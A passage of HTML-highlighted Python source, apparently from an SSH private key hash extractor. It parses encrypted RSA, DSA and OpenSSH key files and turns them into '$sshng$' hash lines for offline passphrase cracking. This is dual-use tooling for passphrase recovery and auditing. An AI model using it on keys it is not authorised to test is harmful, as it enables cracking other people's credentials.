class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">while</span> len(data) &gt; x + <span class="number">16</span>:</span><br><span class="line">        out.append(format_binary_line(data[x:x + <span class="number">16</span>]))</span><br><span class="line">        x += <span class="number">16</span></span><br><span class="line">    <span class="keyword">if</span> x &lt; len(data):</span><br><span class="line">        out.append(format_binary_line(data[x:]))</span><br><span class="line">    <span class="keyword">return</span> [prefix + y <span class="keyword">for</span> y <span class="keyword">in</span> out]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_binary_line</span>(<span class="params">data</span>):</span></span><br><span class="line">    left = <span class="string">&#x27; &#x27;</span>.join([<span class="string">&#x27;%02X&#x27;</span> % ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line">    right = <span class="string">&#x27;&#x27;</span>.join([(<span class="string">&#x27;.%c..&#x27;</span> % c)[(ord(c) + <span class="number">63</span>) // <span class="number">95</span>] <span class="keyword">for</span> c <span class="keyword">in</span> data])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;%-50s %s&#x27;</span> % (left, right)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexify</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hexlify(s).upper()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unhexify</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> unhexlify(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_string</span>(<span class="params">s</span>):</span></span><br><span class="line">    out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> (ord(c) &gt;= <span class="number">32</span>) <span class="keyword">and</span> (ord(c) &lt;= <span class="number">127</span>):</span><br><span class="line">            out += c</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            out += <span class="string">&#x27;%%%02X&#x27;</span> % ord(c)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit_length</span>(<span class="params">n</span>):</span></span><br><span class="line">    norm = deflate_long(n, <span class="number">0</span>)</span><br><span class="line">    hbyte = ord(norm[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> hbyte == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    bitlen = len(norm) * <span class="number">8</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (hbyte &amp; <span class="number">0x80</span>):</span><br><span class="line">        hbyte &lt;&lt;= <span class="number">1</span></span><br><span class="line">        bitlen -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> bitlen</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tb_strings</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(traceback.format_exception(*sys.exc_info())).split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key_bytes</span>(<span class="params">hashclass, salt, key, nbytes</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Given a password, passphrase, or other human-source key, scramble it</span></span><br><span class="line"><span class="string">    through a secure hash into some keyworthy bytes.  This specific algorithm</span></span><br><span class="line"><span class="string">    is used for encrypting/decrypting private key files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @param hashclass: class from L&#123;Crypto.Hash&#125; that can be used as a secure</span></span><br><span class="line"><span class="string">        hashing function (like C&#123;MD5&#125; or C&#123;SHA&#125;).</span></span><br><span class="line"><span class="string">    @type hashclass: L&#123;Crypto.Hash&#125;</span></span><br><span class="line"><span class="string">    @param salt: data to salt the hash with.</span></span><br><span class="line"><span class="string">    @type salt: string</span></span><br><span class="line"><span class="string">    @param key: human-entered password or passphrase.</span></span><br><span class="line"><span class="string">    @type key: string</span></span><br><span class="line"><span class="string">    @param nbytes: number of bytes to generate.</span></span><br><span class="line"><span class="string">    @type nbytes: int</span></span><br><span class="line"><span class="string">    @return: key data</span></span><br><span class="line"><span class="string">    @rtype: string</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    keydata = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    digest = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> len(salt) &gt; <span class="number">8</span>:</span><br><span class="line">        salt = salt[:<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">while</span> nbytes &gt; <span class="number">0</span>:</span><br><span class="line">        hash_obj = hashclass()</span><br><span class="line">        <span class="keyword">if</span> len(digest) &gt; <span class="number">0</span>:</span><br><span class="line">            hash_obj.update(digest)</span><br><span class="line">        hash_obj.update(key)</span><br><span class="line">        hash_obj.update(salt)</span><br><span class="line">        digest = hash_obj.digest()</span><br><span class="line">        size = min(nbytes, len(digest))</span><br><span class="line">        keydata += digest[:size]</span><br><span class="line">        nbytes -= size</span><br><span class="line">    <span class="keyword">return</span> keydata</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Common API for all public keys.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PKey</span> (<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Base class for public keys.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># known encryption types for private key files:</span></span><br><span class="line">    _CIPHER_TABLE = &#123;</span><br><span class="line">        <span class="string">&#x27;AES-128-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: AES, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;mode&#x27;</span>: AES.MODE_CBC&#125;,</span><br><span class="line">        <span class="string">&#x27;DES-EDE3-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: DES3, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">8</span>, <span class="string">&#x27;mode&#x27;</span>: DES3.MODE_CBC&#125;,</span><br><span class="line">        <span class="string">&#x27;AES-256-CBC&#x27;</span>: &#123;<span class="string">&#x27;cipher&#x27;</span>: AES, <span class="string">&#x27;keysize&#x27;</span>: <span class="number">32</span>, <span class="string">&#x27;blocksize&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;mode&#x27;</span>: AES.MODE_CBC&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, msg=None, data=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a new instance of this public key type.  If C&#123;msg&#125; is given,</span></span><br><span class="line"><span class="string">        the key&#x27;s public part(s) will be filled in from the message.  If</span></span><br><span class="line"><span class="string">        C&#123;data&#125; is given, the key&#x27;s public part(s) will be filled in from</span></span><br><span class="line"><span class="string">        the string.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param msg: an optional SSH L&#123;Message&#125; containing a public key of this</span></span><br><span class="line"><span class="string">        type.</span></span><br><span class="line"><span class="string">        @type msg: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        @param data: an optional string containing a public key of this type</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise SSHException: if a key cannot be created from the C&#123;data&#125; or</span></span><br><span class="line"><span class="string">        C&#123;msg&#125; given, or no key was passed in.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return a string of an SSH L&#123;Message&#125; made up of the public part(s) of</span></span><br><span class="line"><span class="string">        this key.  This string is suitable for passing to L&#123;__init__&#125; to</span></span><br><span class="line"><span class="string">        re-create the key object later.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: string representation of an SSH key message.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__cmp__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Compare this key to another.  Returns 0 if this key is equivalent to</span></span><br><span class="line"><span class="string">        the given key, or non-0 if they are different.  Only the public parts</span></span><br><span class="line"><span class="string">        of the key are compared, so a public key will compare equal to its</span></span><br><span class="line"><span class="string">        corresponding private key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param other: key to compare to.</span></span><br><span class="line"><span class="string">        @type other: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string">        @return: 0 if the two keys are equivalent, non-0 otherwise.</span></span><br><span class="line"><span class="string">        @rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        hs = hash(self)</span><br><span class="line">        ho = hash(other)</span><br><span class="line">        <span class="keyword">if</span> hs != ho:</span><br><span class="line">            <span class="keyword">return</span> cmp(hs, ho)</span><br><span class="line">        <span class="keyword">return</span> cmp(str(self), str(other))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return the name of this private key implementation.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: name of this private key type, in SSH terminology (for</span></span><br><span class="line"><span class="string">        example, C&#123;&quot;ssh-rsa&quot;&#125;).</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bits</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return the number of significant bits in this key.  This is useful</span></span><br><span class="line"><span class="string">        for judging the relative security of a key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: bits in the key.</span></span><br><span class="line"><span class="string">        @rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">can_sign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return C&#123;True&#125; if this key has the private part necessary for signing</span></span><br><span class="line"><span class="string">        data.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: C&#123;True&#125; if this is a private key.</span></span><br><span class="line"><span class="string">        @rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_fingerprint</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return an MD5 fingerprint of the public part of this key.  Nothing</span></span><br><span class="line"><span class="string">        secret is revealed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: a 16-byte string (binary) of the MD5 fingerprint, in SSH</span></span><br><span class="line"><span class="string">            format.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> MD5.new(str(self)).digest()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_base64</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Return a base64 string containing the public part of this key.  Nothing</span></span><br><span class="line"><span class="string">        secret is revealed.  This format is compatible with that used to store</span></span><br><span class="line"><span class="string">        public key files or recognized host keys.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @return: a base64 string containing the public part of the key.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> base64.encodestring(str(self)).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign_ssh_data</span>(<span class="params">self, rng, data</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Sign a blob of data with this private key, and return a L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        representing an SSH signature message.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param rng: a secure random number generator.</span></span><br><span class="line"><span class="string">        @type rng: L&#123;Crypto.Util.rng.RandomPool&#125;</span></span><br><span class="line"><span class="string">        @param data: the data to sign.</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string">        @return: an SSH signature message.</span></span><br><span class="line"><span class="string">        @rtype: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_ssh_sig</span>(<span class="params">self, data, msg</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Given a blob of data, and an SSH message representing a signature of</span></span><br><span class="line"><span class="string">        that data, verify that it was signed with this key.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param data: the data that was signed.</span></span><br><span class="line"><span class="string">        @type data: str</span></span><br><span class="line"><span class="string">        @param msg: an SSH signature message</span></span><br><span class="line"><span class="string">        @type msg: L&#123;Message&#125;</span></span><br><span class="line"><span class="string">        @return: C&#123;True&#125; if the signature verifies correctly; C&#123;False&#125;</span></span><br><span class="line"><span class="string">            otherwise.</span></span><br><span class="line"><span class="string">        @rtype: boolean</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_private_key_file</span>(<span class="params">cls, filename, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a key object by reading a private key file.  If the private</span></span><br><span class="line"><span class="string">        key is encrypted and C&#123;password&#125; is not C&#123;None&#125;, the given password</span></span><br><span class="line"><span class="string">        will be used to decrypt the key (otherwise L&#123;PasswordRequiredException&#125;</span></span><br><span class="line"><span class="string">        is thrown).  Through the magic of python, this factory method will</span></span><br><span class="line"><span class="string">        exist in all subclasses of PKey (such as L&#123;RSAKey&#125; or L&#123;DSSKey&#125;), but</span></span><br><span class="line"><span class="string">        is useless on the abstract PKey class.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param filename: name of the file to read</span></span><br><span class="line"><span class="string">        @type filename: str</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key file,</span></span><br><span class="line"><span class="string">            if it&#x27;s encrypted</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: a new key object based on the given private key</span></span><br><span class="line"><span class="string">        @rtype: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the file</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is</span></span><br><span class="line"><span class="string">            encrypted, and C&#123;password&#125; is C&#123;None&#125;</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = cls(filename=filename, password=password)</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line">    from_private_key_file = classmethod(from_private_key_file)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">from_private_key</span>(<span class="params">cls, file_obj, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Create a key object by reading a private key from a file (or file-like)</span></span><br><span class="line"><span class="string">        object.  If the private key is encrypted and C&#123;password&#125; is not C&#123;None&#125;,</span></span><br><span class="line"><span class="string">        the given password will be used to decrypt the key (otherwise</span></span><br><span class="line"><span class="string">        L&#123;PasswordRequiredException&#125; is thrown).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param file_obj: the file to read from</span></span><br><span class="line"><span class="string">        @type file_obj: file</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key, if it&#x27;s</span></span><br><span class="line"><span class="string">            encrypted</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: a new key object based on the given private key</span></span><br><span class="line"><span class="string">        @rtype: L&#123;PKey&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the key</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is encrypted,</span></span><br><span class="line"><span class="string">            and C&#123;password&#125; is C&#123;None&#125;</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        key = cls(file_obj=file_obj, password=password)</span><br><span class="line">        <span class="keyword">return</span> key</span><br><span class="line">    from_private_key = classmethod(from_private_key)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_read_private_key_file</span>(<span class="params">self, tag, filename, password=None</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Read an SSH2-format private key file, looking for a string of the type</span></span><br><span class="line"><span class="string">        C&#123;&quot;BEGIN xxx PRIVATE KEY&quot;&#125; for some C&#123;xxx&#125;, base64-decode the text we</span></span><br><span class="line"><span class="string">        find, and return it as a string.  If the private key is encrypted and</span></span><br><span class="line"><span class="string">        C&#123;password&#125; is not C&#123;None&#125;, the given password will be used to decrypt</span></span><br><span class="line"><span class="string">        the key (otherwise L&#123;PasswordRequiredException&#125; is thrown).</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @param tag: C&#123;&quot;RSA&quot;&#125; or C&#123;&quot;DSA&quot;&#125;, the tag used to mark the data block.</span></span><br><span class="line"><span class="string">        @type tag: str</span></span><br><span class="line"><span class="string">        @param filename: name of the file to read.</span></span><br><span class="line"><span class="string">        @type filename: str</span></span><br><span class="line"><span class="string">        @param password: an optional password to use to decrypt the key file,</span></span><br><span class="line"><span class="string">            if it&#x27;s encrypted.</span></span><br><span class="line"><span class="string">        @type password: str</span></span><br><span class="line"><span class="string">        @return: data blob that makes up the private key.</span></span><br><span class="line"><span class="string">        @rtype: str</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        @raise IOError: if there was an error reading the file.</span></span><br><span class="line"><span class="string">        @raise PasswordRequiredException: if the private key file is</span></span><br><span class="line"><span class="string">            encrypted, and C&#123;password&#125; is C&#123;None&#125;.</span></span><br><span class="line"><span class="string">        @raise SSHException: if the key file is invalid.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = open(filename, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % str(e))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        data = self._read_private_key(tag, f, password)</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_read_private_key</span>(<span class="params">self, tag, f, password=None</span>):</span></span><br><span class="line">        lines = f.readlines()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;BEGIN RSA PRIVATE&quot;</span> <span class="keyword">in</span> lines[<span class="number">0</span>]:</span><br><span class="line">            tag = <span class="string">&quot;RSA&quot;</span></span><br><span class="line">            self.type = <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----&quot;</span> <span class="keyword">in</span> lines[<span class="number">0</span>]:</span><br><span class="line">            <span class="comment"># new private key format for OpenSSH (automatically enabled for</span></span><br><span class="line">            <span class="comment"># keys using ed25519 signatures), ed25519 stuff is not supported</span></span><br><span class="line">            <span class="comment"># yet!</span></span><br><span class="line">            self.type = <span class="number">2</span>  <span class="comment"># bcrypt pbkdf + aes-256-cbc</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.type = <span class="number">1</span></span><br><span class="line">            tag = <span class="string">&quot;DSA&quot;</span></span><br><span class="line"></span><br><span class="line">        start = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> (start &lt; len(lines)) <span class="keyword">and</span> ((lines[start].strip() != <span class="string">&#x27;-----BEGIN &#x27;</span> + tag + <span class="string">&#x27; PRIVATE KEY-----&#x27;</span>) <span class="keyword">and</span> (lines[start].strip() != <span class="string">&#x27;-----BEGIN OPENSSH PRIVATE KEY-----&#x27;</span>)):</span><br><span class="line">            start += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> start &gt;= len(lines):</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s is not a valid private key file\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># parse any headers first</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        start += <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> start &lt; len(lines):</span><br><span class="line">            l = lines[start].split(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> len(l) == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            headers[l[<span class="number">0</span>].lower()] = l[<span class="number">1</span>].strip()</span><br><span class="line">            start += <span class="number">1</span></span><br><span class="line">        <span class="comment"># find end</span></span><br><span class="line">        end = start</span><br><span class="line">        <span class="keyword">while</span> ((lines[end].strip() != <span class="string">&#x27;-----END OPENSSH PRIVATE KEY-----&#x27;</span>) <span class="keyword">and</span> (lines[end].strip() != <span class="string">&#x27;-----END &#x27;</span> + tag + <span class="string">&#x27; PRIVATE KEY-----&#x27;</span>)) <span class="keyword">and</span> (end &lt; len(lines)):</span><br><span class="line">            end += <span class="number">1</span></span><br><span class="line">        <span class="comment"># if we trudged to the end of the file, just try to cope.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="string">&#x27;&#x27;</span>.join(lines[start:end]).encode()</span><br><span class="line">            data = base64.decodestring(data)</span><br><span class="line">        <span class="keyword">except</span> base64.binascii.Error:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;base64 decoding error: &#x27;</span> + str(e))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;proc-type&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> headers <span class="keyword">and</span> self.type != <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># unencryped: done</span></span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="comment"># encrypted keyfile: will need a password</span></span><br><span class="line">        <span class="keyword">if</span> self.type != <span class="number">2</span> <span class="keyword">and</span> headers[<span class="string">&#x27;proc-type&#x27;</span>] != <span class="string">&#x27;4,ENCRYPTED&#x27;</span>:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unknown private key structure &quot;%s&quot;&#x27;</span> % headers[<span class="string">&#x27;proc-type&#x27;</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            encryption_type, saltstr = headers[<span class="string">&#x27;dek-info&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type != <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Can\&#x27;t parse DEK-info in private key file&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                encryption_type = <span class="string">&quot;AES-256-CBC&quot;</span></span><br><span class="line">                saltstr = <span class="string">&quot;fefe&quot;</span></span><br><span class="line">        <span class="keyword">if</span> encryption_type <span class="keyword">not</span> <span class="keyword">in</span> self._CIPHER_TABLE:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unknown private key cipher &quot;%s&quot;&#x27;</span> % encryption_type)</span><br><span class="line">        <span class="comment"># if no password was passed in, raise an exception pointing out that we need one</span></span><br><span class="line">        <span class="keyword">if</span> password <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> PasswordRequiredException(<span class="string">&#x27;Private key file is encrypted&#x27;</span>)</span><br><span class="line">        cipher = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;cipher&#x27;</span>]</span><br><span class="line">        keysize = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;keysize&#x27;</span>]</span><br><span class="line">        mode = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;mode&#x27;</span>]</span><br><span class="line">        salt = unhexlify(saltstr)</span><br><span class="line">        <span class="keyword">if</span> self.type == <span class="number">2</span>:</span><br><span class="line">            salt_offset = <span class="number">47</span>  <span class="comment"># XXX is this fixed?</span></span><br><span class="line">            salt_length = <span class="number">16</span></span><br><span class="line">            saltstr = data[salt_offset:salt_offset+salt_length].encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">        data = binascii.hexlify(data).decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> keysize == <span class="number">24</span>:</span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s&quot;</span> % (f.name, <span class="number">0</span>,</span><br><span class="line">                len(salt), saltstr, len(data) // <span class="number">2</span>, data)</span><br><span class="line">        <span class="keyword">elif</span> keysize == <span class="number">16</span>:</span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s&quot;</span> % (f.name, <span class="number">1</span>, len(saltstr) // <span class="number">2</span>,</span><br><span class="line">                saltstr, len(data) // <span class="number">2</span>, data)</span><br><span class="line">        <span class="keyword">elif</span> keysize == <span class="number">32</span> <span class="keyword">and</span> self.type == <span class="number">2</span>:  <span class="comment"># bcrypt pbkdf + aes-256-cbc</span></span><br><span class="line">            <span class="comment"># round value appears after salt</span></span><br><span class="line">            rounds = <span class="number">16</span></span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s$%d&quot;</span> % (f.name, <span class="number">2</span>, len(saltstr) // <span class="number">2</span>,</span><br><span class="line">                saltstr, len(data) // <span class="number">2</span>, data, rounds)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s uses unsupported cipher, please file a bug!\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> limited:</span><br><span class="line">            key = generate_key_bytes(MD5, salt, password, keysize)</span><br><span class="line">            data = cipher.new(key, mode, salt).decrypt(data)</span><br><span class="line">            <span class="comment"># check encoding</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                d = PKCS7Encoder()</span><br><span class="line">                ddata = d.decode(data)</span><br><span class="line">                <span class="keyword">return</span> ddata</span><br><span class="line">            <span class="keyword">except</span> ValueError:  <span class="comment"># incorrect password</span></span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">return</span> self.hashline  <span class="comment"># dummy value</span></span><br><span class="line"></span><br><span class="line"></span><br><span 